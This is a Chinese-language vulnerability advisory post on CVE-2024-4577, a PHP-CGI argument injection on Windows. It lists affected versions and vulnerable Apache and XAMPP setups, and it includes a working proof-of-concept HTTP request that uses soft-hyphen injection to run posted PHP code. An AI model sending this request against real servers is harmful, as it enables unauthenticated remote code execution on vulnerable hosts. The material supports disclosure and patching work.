#  CVE-2024-4577｜PHP CGI Windows平台远程代码执行漏洞（POC）   
alicy  信安百科   2024-06-07 18:29  
  
**0x00 前言**  
  
  
PHP是Hypertext Preprocessor(超文本预处理器)的缩写，源自于“PHP/FI”的工程，在它的起源初期主要用于统计自己网站的访问者，后来用c语言进行了重新编写，拥有了自己的访问文件和数据库功能．在1995年发布了PHP 1．0第一个版本。  
  
  
PHP是一种广泛使用的开源的脚本语言，它特别适合Web开发和嵌入HTML中，这种语言使用起来简单。  
  
  
CGI、以CGI的方式运行，CGI英文叫做公共网关接口，就是Apache在遇到PHP脚本的时候会将PHP程序提交给CGI应用程序（php-cgi.exe）解释，解释之后的结果返回给Apache，然后再返回给相应的请求用户。  
  
  
  
**0x01 漏洞描述**  
  
> PHP 在设计时忽略 Windows 中对字符转换的Best-Fit 特性，当PHP运行在Window平台且使用了如下语系（简体中文936/繁体中文950/日文932等）时，攻击者可构造恶意请求绕过CVE-2012-1823 保护，从而可在无需登陆的情况下执行任意PHP代码。  
  
  
  
  
  
**0x02 CVE编号**  
  
  
CVE-2024-4577  
  
  
  
**0x03 影响版本**  
  
  
PHP 8.3 < 8.3.8  
  
PHP 8.2 < 8.2.20  
  
PHP 8.1 < 8.1.29  
  
  
针对其他版本，PHP官方已不在维护，建议根据实际情况进行缓解措施。  
  
  
情境一：  
  
将PHP设定于CGI模式下执行  
  
在Apache Httpd设定档中透过Action语法将对应的HTTP请求交给PHP-CGI执行档处理时，受此弱点影响，常见设定包含但不限于：  
```
AddHandler cgi-script .php
Action cgi-script“/cgi-bin/php-cgi.exe”
```  
  
或  
```
<FilesMatch“\.php$”>
SetHandler application/x-httpd-php-cgi
</FilesMatch>
Action application/x-httpd-php-cgi“/php-cgi/php-cgi.exe”
```  
  
  
情境二：  
  
将PHP执行档暴露在外（XAMPP预设安装设定）  
  
即使未设定PHP于CGI模式下执行，仅将PHP执行档暴露在CGI目录下也受此弱点影响，常见情况包含但不限于：  
  
将php.exe或php-cgi.exe复制到/cgi-bin/目录中  
  
将PHP安装目录透过ScriptAlias暴露到外，如：  
```
ScriptAlias /php-cgi/“C:/xampp/php/”
```  
  
  
  
**0x04 漏洞详情**  
  
****  
POC：  
```
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>
```  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6uo4d483Olm9GcP162GBHOvZJ5bptdia6ibFD21x9HbukD3KeXf8FWq7RdPX0Uibmp2icmQ51n1krFa6pA/640?wx_fmt=png&from=appmsg "")  
  
  
  
执行命令：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6uo4d483Olm9GcP162GBHOvZ2w01Wq6ZQT8NeDEFq3QO84G8ShKzC9sUDK82k4SH3kMaUa8OElgf9g/640?wx_fmt=png&from=appmsg "")  
  
(来源于网络)  
  
  
  
**0x05 参考链接**  
  
  
https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/  
  
  
  
  
推荐阅读：  
  
  
[CVE-2024-24919｜CheckPoint Gateway任意文件读取漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485375&idx=1&sn=65e8515e23d1c84030d976d50f2e9615&chksm=cea96e66f9dee770a8a78a2b2b551a99a91b768f08464fd816b08dd7696894232b83923f8baa&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-21683｜Atlassian Confluence远程代码执行漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485351&idx=2&sn=0adc42b4d60e706882552cdd8c61db21&chksm=cea96e7ef9dee7686226667380cede00bff25f0cfbeb37361ea7e4d10ef65d4c526ba54168f8&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-4985｜GitHub Enterprise Server身份验证绕过漏洞（POC）](http://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485351&idx=1&sn=43476287a5e8d12e56ff5f82b16417ed&chksm=cea96e7ef9dee768c9b7acf27dc5088b21493f1e5bde1dae0914bd45424895ef34022573ad96&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
